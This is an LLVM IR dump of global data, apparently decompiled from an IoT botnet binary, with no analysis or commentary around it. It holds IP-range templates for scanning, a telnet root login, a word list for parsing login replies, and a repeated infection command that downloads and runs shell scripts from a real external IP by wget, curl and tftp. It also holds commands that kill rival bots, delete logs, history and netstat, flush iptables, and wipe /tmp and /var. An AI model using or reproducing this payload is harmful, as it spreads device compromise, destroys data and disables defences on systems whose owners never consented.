source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2c140.13 = global i32 0
@global_var_13230.17 = constant i32 -509558771
@global_var_2c604.20 = global i32 0
@global_var_2c608.21 = local_unnamed_addr global i32 0
@global_var_2c60c.22 = local_unnamed_addr global i32 0
@global_var_2c280.25 = local_unnamed_addr global i32 4095
@global_var_2c27c.28 = global i32 362436
@global_var_1f970.30 = constant [7 x i8] c"(null)\00"
@global_var_30604.32 = local_unnamed_addr global i32 0
@global_var_1f978.34 = constant [8 x i8] c"/bin/sh\00"
@global_var_1f980.36 = constant [3 x i8] c"sh\00"
@global_var_1f984.38 = constant [3 x i8] c"-c\00"
@global_var_1f988.41 = constant i32 -1
@global_var_1fd88.43 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1fd98.45 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2c5e8.50 = global i32 0
@global_var_1fda4.52 = constant [5 x i8] c"PING\00"
@global_var_1fdac.54 = constant [14 x i8] c"gethostbyname\00"
@global_var_2c5f0.56 = global i32 0
@global_var_2c5f4.57 = local_unnamed_addr global i32 0
@global_var_32850.59 = global i32 0
@global_var_1fdbc.61 = constant [6 x i8] c":>%$#\00"
@global_var_1fdc4.71 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1fdd0.73 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_1fde0.75 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1fdec.77 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1fdfc.79 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1fe08.81 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1fe18.83 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1fe24.85 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1fe34.87 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1fe44.89 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1fe54.91 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1fe64.93 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1fe70.95 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_1fe80.97 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1fe90.99 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1fea0.101 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1feb0.103 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1fec0.105 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1fed0.107 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1fee0.109 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1feec.111 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1fef8.113 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1ff08.115 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1ff14.117 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1ff20.119 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1ff2c.121 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1ff38.123 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1ff44.125 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1ff54.127 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1ff64.129 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1ff70.131 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1ff80.133 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1ff8c.135 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1ff98.137 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1ffa4.139 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1ffb0.141 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1ffbc.143 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1ffc8.145 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1ffd4.147 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1ffe4.149 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1fff4.151 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_20004.153 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_20014.155 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_20024.157 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_20034.159 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_20044.161 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_20054.163 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_20064.165 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_20074.167 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_20084.169 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_20094.171 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_200a4.173 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_200b4.175 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_200c4.177 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_200d4.179 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_200e4.181 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_200f4.183 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_20104.185 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_20114.187 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_20124.189 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_20134.191 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_20144.193 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_20154.195 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_20164.197 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_20174.199 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_20184.201 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_20194.203 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_201a4.205 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_201b4.207 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_201c4.210 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_201d4.212 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_201e4.214 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_201f4.216 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_20204.218 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_20214.220 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_20224.222 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_20234.224 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_20244.226 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_20254.228 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_20264.230 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_20274.232 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_20284.234 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_20294.236 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_202a4.238 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_202b4.240 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_202c4.242 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_202d4.244 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_202e4.246 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_202f4.248 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_20304.250 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_20314.252 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_20324.254 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_20334.256 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_20344.258 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_20354.260 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_20364.262 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_20374.264 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_20384.266 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_20394.268 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_203a0.270 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_203b0.272 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_203c0.274 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_203d0.276 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_203dc.278 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_203ec.280 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_203fc.282 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_2040c.284 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_2041c.286 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_2042c.288 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_2043c.290 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_2044c.292 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_2045c.294 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_2046c.296 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_2047c.298 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_2048c.300 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_2049c.302 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_204ac.304 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_204bc.306 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_204cc.308 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_204d8.310 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_204e8.312 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_204f8.314 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_20508.316 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_20518.318 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_20528.320 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_20538.322 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_20548.324 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_20558.326 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_20568.328 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_20578.330 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_20588.332 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_20598.334 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_205a8.336 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_205b8.338 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_205c8.340 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_205d8.342 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_205e8.344 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_205f8.346 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_20608.348 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_20618.350 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_20628.352 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_20638.354 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_20648.357 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_20658.359 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_20668.361 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_20678.364 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_20688.366 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_20698.368 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_206a8.370 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_206b8.372 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_206c8.374 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_206d4.376 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_206e4.378 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_206f4.380 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_20704.382 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_20714.384 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_20724.386 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_20734.388 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_20744.390 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_20754.392 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_20764.394 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_20774.396 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_20784.398 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_20794.400 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_207a4.402 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_207b4.404 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_207c4.406 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_207d4.408 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_207e4.410 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_207f4.412 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_20804.414 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_20814.416 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_20824.419 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_20834.421 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_20844.423 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_20854.425 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_20864.427 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_20874.429 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_20884.431 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_20894.433 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_208a4.435 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_208b4.437 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_208c4.439 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_208d4.441 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_208e4.443 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_208f4.445 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_20904.447 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_20914.449 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_20924.451 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_20934.453 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_20944.455 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_20954.457 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_20964.459 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_20974.461 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_20984.463 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_20994.465 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_209a4.467 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_209b4.469 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_2c284.472 = global i32 110
@global_var_209c4.476 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_32844.478 = global i32 0
@global_var_1f960.480 = constant [8 x i8] c"BusyBox\00"
@global_var_1f968.481 = constant i32 36
@global_var_1f96c.482 = constant i32 35
@global_var_2c238.483 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f960.480, i32 0, i32 0), i8* bitcast (i32* @global_var_1f968.481 to i8*), i8* bitcast (i32* @global_var_1f96c.482 to i8*)]
@global_var_1f928.485 = constant [7 x i8] c"nvalid\00"
@global_var_1f930.486 = constant [6 x i8] c"ailed\00"
@global_var_1f938.487 = constant [9 x i8] c"ncorrect\00"
@global_var_1f944.488 = constant [6 x i8] c"enied\00"
@global_var_1f94c.489 = constant [5 x i8] c"rror\00"
@global_var_1f954.490 = constant [7 x i8] c"oodbye\00"
@global_var_1f95c.491 = constant [4 x i8] c"bad\00"
@global_var_2c218.492 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f928.485, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f930.486, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f938.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f944.488, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f94c.489, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f954.490, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f95c.491, i32 0, i32 0)]
@global_var_2c204 = external global i32
@global_var_1f7b8.499 = constant [7 x i8] c"telnet\00"
@global_var_1f7c0.500 = constant [5 x i8] c"root\00"
@global_var_1f7c8.501 = constant i32 0
@global_var_1f7cc.502 = constant [318 x i8] c"cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_2c1e8.503 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f7b8.499, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7c0.500, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7c0.500, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f7b8.499, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7c0.500, i32 0, i32 0), i8* bitcast (i32* @global_var_1f7c8.501 to i8*), i8* getelementptr inbounds ([318 x i8], [318 x i8]* @global_var_1f7cc.502, i32 0, i32 0)]
@global_var_209d0.505 = constant [3 x i8] c"\0D\0A\00"
@global_var_2c1f4.507 = global [4 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f7b8.499, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7c0.500, i32 0, i32 0), i8* bitcast (i32* @global_var_1f7c8.501 to i8*), i8* getelementptr inbounds ([318 x i8], [318 x i8]* @global_var_1f7cc.502, i32 0, i32 0)]
@global_var_2c248.509 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f928.485, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f930.486, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f938.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f944.488, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f94c.489, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f954.490, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f95c.491, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f960.480, i32 0, i32 0), i8* bitcast (i32* @global_var_1f968.481 to i8*), i8* bitcast (i32* @global_var_1f96c.482 to i8*)]
@global_var_209d4.512 = constant i32 993024795
@global_var_20a40.514 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_2c200.516 = local_unnamed_addr global [318 x i8]* @global_var_1f7cc.502
@global_var_20a50.518 = constant [327 x i8] c"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A x00\00"
@global_var_20b98.520 = constant [3 x i8] c"AA\00"
@global_var_20ba0.522 = constant [320 x i8] c"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_20e68.524 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_20e78.525 = constant [6 x i8] c"/tmp/\00"
@global_var_20e80.526 = constant [6 x i8] c"/var/\00"
@global_var_20e88.527 = constant [6 x i8] c"/dev/\00"
@global_var_20e90.528 = constant [10 x i8] c"/var/run/\00"
@global_var_20e9c.529 = constant [10 x i8] c"/dev/shm/\00"
@global_var_20ea8.530 = constant [6 x i8] c"/mnt/\00"
@global_var_20eb0.531 = constant [7 x i8] c"/boot/\00"
@global_var_20eb8.532 = constant [6 x i8] c"/usr/\00"
@global_var_20da8.544 = constant [5 x i8] c"wget\00"
@global_var_20db0.545 = constant [6 x i8] c"armv*\00"
@global_var_20d44.546 = constant [5 x i8] c"bot*\00"
@global_var_20db8.547 = constant [6 x i8] c"ntpd*\00"
@global_var_20d58.548 = constant [7 x i8] c"hackz*\00"
@global_var_20dc0.549 = constant [8 x i8] c"shitty*\00"
@global_var_20dc8.550 = constant [6 x i8] c"jack*\00"
@global_var_20d1c.551 = constant [6 x i8] c"mips*\00"
@global_var_20cfc.552 = constant [5 x i8] c"sex*\00"
@global_var_20dd0.553 = constant [4 x i8] c"i86\00"
@global_var_20dd4.554 = constant [5 x i8] c"ssh*\00"
@global_var_20d3c.555 = constant [5 x i8] c"sh4*\00"
@global_var_20d4c.556 = constant [11 x i8] c"jackmeoff*\00"
@global_var_20d04.557 = constant [6 x i8] c"tftp*\00"
@global_var_20ddc.558 = constant [4 x i8] c"i56\00"
@global_var_20de0.559 = constant [5 x i8] c"mips\00"
@global_var_20de8.560 = constant [7 x i8] c"mipsel\00"
@global_var_20df0.561 = constant [4 x i8] c"sh4\00"
@global_var_20df4.562 = constant [4 x i8] c"x86\00"
@global_var_20df8.563 = constant [5 x i8] c"i686\00"
@global_var_20e00.564 = constant [4 x i8] c"ppc\00"
@global_var_20e04.565 = constant [5 x i8] c"i586\00"
@global_var_20e0c.566 = constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20da8.544, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20db0.545, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20d44.546, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20db8.547, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20d58.548, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20dc0.549, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20dc8.550, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20d1c.551, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20cfc.552, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20dd0.553, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20dd4.554, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20d3c.555, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20d4c.556, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20d04.557, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20ddc.558, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20de0.559, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20de8.560, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20df0.561, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20df4.562, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20df8.563, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_20e00.564, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20e04.565, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20e04.565, i32 0, i32 0)]
@global_var_20ce0.568 = constant [8 x i8] c"jackmy*\00"
@global_var_20ce8.569 = constant [9 x i8] c"busybox*\00"
@global_var_20cf4.570 = constant [5 x i8] c"bin*\00"
@global_var_20d0c.571 = constant [5 x i8] c"arm*\00"
@global_var_20d14.572 = constant [8 x i8] c"mipsel*\00"
@global_var_20d24.573 = constant [8 x i8] c"mips64*\00"
@global_var_20d2c.574 = constant [6 x i8] c"i686*\00"
@global_var_20d34.575 = constant [7 x i8] c"sparc*\00"
@global_var_20d60.576 = constant [6 x i8] c"bruv*\00"
@global_var_20d98.589 = constant [4 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20d44.546, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20d4c.556, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20d58.548, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20d60.576, i32 0, i32 0)]
@global_var_20ee8.594 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_20f6c.598 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_fbc0.599 = constant i32 -442564500
@global_var_20f7c.601 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_20fa8.603 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_20fc0.605 = constant [22 x i8] c"history -c;history -w\00"
@global_var_20fd8.607 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_20fe8.609 = constant [11 x i8] c"history -c\00"
@global_var_20ff4.611 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_2100c.613 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_21020.615 = constant [11 x i8] c"history -w\00"
@global_var_2102c.617 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_21040.619 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_21050.621 = constant [22 x i8] c"service iptables stop\00"
@global_var_21068.623 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_210b4.625 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_210f4.626 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_21134.627 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_211c4.628 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_211fc.629 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_2121c.630 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_21234.631 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_2128c.632 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_2132c.633 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
